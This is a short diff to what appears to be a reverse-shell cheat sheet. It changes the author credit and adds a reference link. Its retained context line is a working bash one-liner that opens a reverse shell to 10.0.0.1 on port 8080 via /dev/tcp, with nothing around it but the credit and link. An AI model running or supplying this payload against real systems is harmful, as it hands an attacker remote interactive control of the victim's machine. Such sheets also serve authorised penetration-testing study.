@@ -1,4 +1,8 @@
-- Reverse Shell By Pantestmonkey.net -
+- Reverse Shell By MrMad -
+
+- refrence -
+https://pantestmonkey.net
+
 
 #BASH
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
